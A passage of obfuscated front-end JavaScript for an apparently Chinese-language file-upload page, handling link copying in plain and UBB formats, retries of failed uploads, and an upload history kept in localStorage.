    _0x356e1e.dataset.currentUrl = _0x2e545b.url;
    _0x356e1e.dataset.currentItem = JSON.stringify(_0x2e545b);
    _0x2dd9a8.dataset.currentUrl = _0x2e545b.url;
    _0x2dd9a8.dataset.currentItem = JSON.stringify(_0x2e545b);
    _0x1ea866("historyPreview");
  }
  let _0x3bd89f = null;
  document.getElementById("urlBtn").addEventListener("click", function () {
    const _0x2dc23e = this;
    if (_0x2dc23e.disabled) return;
    _0x3bd89f && clearTimeout(_0x3bd89f);
    const _0x305577 = _0x3009cf.map(_0x812920 => _0x812920.trim()).filter(_0x330eb7 => _0x330eb7 !== "");
    if (_0x305577.length === 0) {
      _0x2dc23e.disabled = true;
      _0x2dc23e.textContent = "没有链接";
      setTimeout(() => {
        _0x2dc23e.disabled = false;
        _0x2dc23e.textContent = "复制直链";
      }, 1500);
      return;
    }
    let _0x315c5e = _0x305577.join("\n\n");
    _0x2dc23e.disabled = true;
    _0x2dc23e.textContent = "复制中...";
    _0x1aa802.value = _0x315c5e;
    _0x478599(_0x1aa802);
    _0x2ac157(_0x315c5e);
    _0x3bd89f = setTimeout(() => {
      _0x2dc23e.disabled = false;
      _0x2dc23e.textContent = "复制直链";
    }, 800);
  });
  document.getElementById("ubbBtn").addEventListener("click", function () {
    const _0x12ede3 = this;
    if (_0x12ede3.disabled) return;
    _0x3bd89f && clearTimeout(_0x3bd89f);
    const _0x5db877 = _0x3009cf.map(_0x4c8397 => _0x4c8397.trim()).filter(_0x234ac6 => _0x234ac6 !== "");
    if (_0x5db877.length === 0) {
      _0x12ede3.disabled = true;
      _0x12ede3.textContent = "没有链接";
      setTimeout(() => {
        _0x12ede3.disabled = false;
        _0x12ede3.textContent = "复制UBB";
      }, 1500);
      return;
    }
    let _0x5e6787 = _0x5db877.map(function (_0x4d4f87) {
      const _0x4e6ddc = _0x140fdb(_0x4d4f87.toLowerCase());
      if (_0x4f74d8(_0x4e6ddc)) {
        return "[img]" + _0x4d4f87 + "[/img]";
      } else return _0x5172da(_0x4e6ddc) ? "[movie]" + _0x4d4f87 + "[/movie]" : _0x4d4f87;
    }).join("\n\n");
    _0x12ede3.disabled = true;
    _0x12ede3.textContent = "复制中...";
    _0x1aa802.value = _0x5e6787;
    _0x478599(_0x1aa802);
    _0x2ac157(_0x5e6787);
    _0x3bd89f = setTimeout(() => {
      _0x12ede3.disabled = false;
      _0x12ede3.textContent = "复制UBB";
    }, 800);
  });
  _0x16f8aa.addEventListener("click", function () {
    {
      _0x3009cf = [];
      _0x1aa802.value = "";
      _0x478599(_0x1aa802);
      _0x3d8127.forEach(_0x592d7e => {
        _0x592d7e.style.display = "none";
      });
      _0x57b40f(0);
      const _0x5b6626 = document.getElementById("progressContainer");
      _0x5b6626 && (_0x5b6626.style.display = "none");
      const _0x1adecd = document.getElementById("uploadSpeed");
      if (_0x1adecd) {
        _0x1adecd.style.display = "none";
      }
      new Noty({
        "text": "已清空所有文件链接",
        "type": "success",
        "timeout": 3000,
        "layout": "topRight"
      }).show();
    }
  });
  document.getElementById("retryFailedBtn").addEventListener("click", function () {
    {
      if (_0x208f77.length === 0) {
        new Noty({
          "text": "没有失败的文件需要重新上传",
          "type": "info",
          "timeout": 3000,
          "layout": "topRight"
        }).show();
        return;
      }
      if (_0x531cb1 > 0) {
        new Noty({
          "text": "当前还有文件正在上传，请等待上传完成后再重新上传失败文件",
          "type": "warning",
          "timeout": 4000,
          "layout": "topRight"
        }).show();
        return;
      }
      new Noty({
        "text": "开始重新上传 " + _0x208f77.length + " 个失败的文件",
        "type": "info",
        "timeout": 3000
      }).show();
      _0x2c066d(_0x208f77);
    }
  });
  async function _0x2c066d(_0x319c10) {
    const _0x57d115 = _0x319c10.length;
    let _0x12a61d = 0,
      _0x353510 = 0;
    _0x531cb1 = _0x57d115;
    let _0x538abf = [];
    for (let _0xc42197 = 0; _0xc42197 < _0x319c10.length; _0xc42197++) {
      const _0x24d513 = _0x319c10[_0xc42197];
      try {
        await _0x35d446(_0x24d513);
        _0x12a61d++;
        new Noty({
          "text": _0x24d513.name + " 重新上传成功 (" + _0x12a61d + "/" + _0x57d115 + ")",
          "type": "success",
          "timeout": 2000,
          "layout": "topRight"
        }).show();
      } catch (_0x1b53b4) {
        _0x353510++;
        _0x538abf.push(_0x24d513);
        new Noty({
          "text": _0x24d513.name + " 重新上传失败",
          "type": "error",
          "timeout": 5000
        }).show();
      }
    }
    _0x208f77 = _0x208f77.filter(_0x49686b => !_0x319c10.some(_0x18ecc3 => _0x18ecc3.name === _0x49686b.name && _0x18ecc3.size === _0x49686b.size));
    _0x208f77 = _0x208f77.concat(_0x538abf);
    _0x531cb1 = 0;
    const _0x5b5a68 = document.getElementById("retryFailedBtn");
    _0x208f77.length > 0 ? _0x5b5a68.style.display = "inline-block" : _0x5b5a68.style.display = "none";
    _0x353510 === 0 ? new Noty({
      "text": "所有失败文件重新上传完成！(" + _0x12a61d + "涓�)",
      "type": "success",
      "timeout": 3000,
      "layout": "topRight"
    }).show() : new Noty({
      "text": "重新上传完成: 成功" + _0x12a61d + "个, 失败" + _0x353510 + "涓�",
      "type": "warning",
      "timeout": 4000,
      "layout": "topRight"
    }).show();
  }
  _0x4bfe78.addEventListener("click", function () {
    localStorage.removeItem("uploadCache");
    _0x293f04();
    _0x5192f5.innerHTML = "<div style=\"text-align: center; color: #6c757d; padding: 20px;\">历史记录已清空</div>";
    new Noty({
      "text": "历史记录已清空",
      "type": "success",
      "timeout": 3000,
      "layout": "topRight"
    }).show();
  });
  function _0xa3bd2c(_0x14733c) {
    _0x1aa802.value = "";
    _0x478599(_0x1aa802);
    _0x13d047();
    _0x3009cf = [];
    document.getElementById("uploadArea").classList.remove("uploading", "dragover");
  }
  function _0x478599(_0x2bf976) {
    _0x2bf976.style.height = "1px";
    _0x2bf976.style.height = _0x2bf976.scrollHeight + "px";
  }
  function _0x2ac157(_0x3fec4e) {
    const _0x363bcb = document.createElement("textarea");
    _0x363bcb.value = _0x3fec4e;
    document.body.appendChild(_0x363bcb);
    _0x363bcb.select();
    document.execCommand("copy");
    document.body.removeChild(_0x363bcb);
    new Noty({
      "text": "已复制到剪贴板!",
      "type": "success",
      "timeout": 3000,
      "layout": "topRight"
    }).show();
  }
  function _0x13d047() {
    _0x3d8127.forEach(_0x4d2dd0 => {
      _0x4d2dd0.style.display = "none";
    });
  }
  function _0x3516f4(_0x302854, _0x4e5706) {
    const _0x9eee30 = new Date().toLocaleString("zh-CN", {
        "hour12": false
      }),
      _0x3891a1 = _0x474493();
    _0x3891a1.push({
      "url": _0x302854,
      "fileName": _0x4e5706,
      "timestamp": _0x9eee30
    });
    localStorage.setItem("uploadCache", JSON.stringify(_0x3891a1));
    _0x293f04();
  }
  let _0x243790 = "upload";
  function _0x1ea866(_0x56a5ad) {
    _0x4eb9a7.style.display = "none";
    _0x5ab3e2.style.display = "none";
    _0x33f3e6.style.display = "none";
    _0x113728.style.display = "none";
    _0x1bb942.style.display = "none";
    _0x3d8127.forEach(_0x513dcd => {
      _0x513dcd.style.display = "none";
    });
    _0x55d96d.classList.remove("active");
    _0x730d59.classList.remove("active");
    if (_0x56a5ad === "upload") _0x4eb9a7.style.display = "block", _0x1bb942.style.display = "block", _0x243790 = "upload", _0x205c91 = false;else {
      if (_0x56a5ad === "about") _0x5ab3e2.style.display = "block", _0x55d96d.classList.add("active"), _0x243790 = "about", _0x205c91 = false;else {
        if (_0x56a5ad === "cache") {
          {
            _0x4eb9a7.style.display = "block";
            _0x33f3e6.style.display = "block";
            _0x730d59.classList.add("active");
            _0x243790 = "cache";
            _0x205c91 = true;
          }
        } else _0x56a5ad === "historyPreview" && (_0x4eb9a7.style.display = "block", _0x113728.style.display = "block", _0x730d59.classList.add("active"), _0x243790 = "historyPreview", _0x205c91 = true);
      }
    }
  }
  let _0x3ac6bb = null,
    _0x7786c2 = 0;
  function _0x474493() {
    const _0x2d972e = Date.now();
    if (!_0x3ac6bb || _0x2d972e - _0x7786c2 > 5000) {
      _0x3ac6bb = JSON.parse(localStorage.getItem("uploadCache")) || [];
      _0x7786c2 = _0x2d972e;
    }
    return _0x3ac6bb;
  }
  function _0x293f04() {
    _0x3ac6bb = null;
  }
  _0x730d59.addEventListener("click", function () {
    if (_0x243790 === "cache" || _0x243790 === "historyPreview") {
      _0x1ea866("upload");
      _0x1bb942.style.display = "block";
      return;
    }
    const _0x8925b6 = _0x474493();
    _0x5192f5.innerHTML = "";
    if (_0x8925b6.length > 0) {
      {
        const _0x2eb425 = document.createDocumentFragment();
        _0x8925b6.slice().reverse().forEach((_0xa5013a, _0x32866d) => {
          const _0x1417ae = document.createElement("div");
          _0x1417ae.className = "cache-item";
          _0x1417ae.textContent = _0xa5013a.timestamp + " - " + _0xa5013a.fileName;
          _0x1417ae.dataset.item = JSON.stringify(_0xa5013a);
          _0x1417ae.dataset.index = _0x32866d;
          _0x2eb425.appendChild(_0x1417ae);
          _0x2eb425.appendChild(document.createElement("br"));
        });
        _0x5192f5.appendChild(_0x2eb425);
      }
    } else _0x5192f5.innerHTML = "<div style=\"text-align: center; color: #6c757d; padding: 20px;\">还没有记录哦！</div>";
    _0x1ea866("cache");
  });
  document.addEventListener("click", function (_0x543431) {
    if (_0x543431.target.classList.contains("cache-item")) {
      {
        const _0x563369 = JSON.parse(_0x543431.target.dataset.item);
        _0x563369 && _0x3bb5c0(_0x563369);
      }
    }
  });
  document.getElementById("historyBackBtn").addEventListener("click", function () {
    _0x1ea866("cache");
  });
  document.getElementById("historyUrlBtn").addEventListener("click", function () {
    {
      const _0x2b39ae = this,
        _0x2aac23 = _0x2b39ae.dataset.currentUrl;
      if (!_0x2aac23) {
        {
          new Noty({
            "text": "没有可复制的链接",
            "type": "error",
            "timeout": 3000,
            "layout": "topRight"
          }).show();
          return;
        }
      }
      _0x2ac157(_0x2aac23);
    }
  });
  document.getElementById("historyUbbBtn").addEventListener("click", function () {
    const _0x492ebb = this,
      _0x440e12 = _0x492ebb.dataset.currentUrl;
    if (!_0x440e12) {
      new Noty({
        "text": "没有可复制的链接",
        "type": "error",
        "timeout": 3000,
        "layout": "topRight"
      }).show();
      return;
    }
    let _0x18337e;
    const _0x327592 = _0x140fdb(_0x440e12.toLowerCase());
    if (_0x4f74d8(_0x327592)) _0x18337e = "[img]" + _0x440e12 + "[/img]";else {
      if (_0x5172da(_0x327592)) {
        _0x18337e = "[movie]" + _0x440e12 + "[/movie]";
      } else _0x18337e = _0x440e12;
    }
    _0x2ac157(_0x18337e);
  });
  _0x55d96d.addEventListener("click", function () {
    _0x243790 === "about" ? (_0x1ea866("upload"), _0x1bb942.style.display = "block") : _0x1ea866("about");
  });
});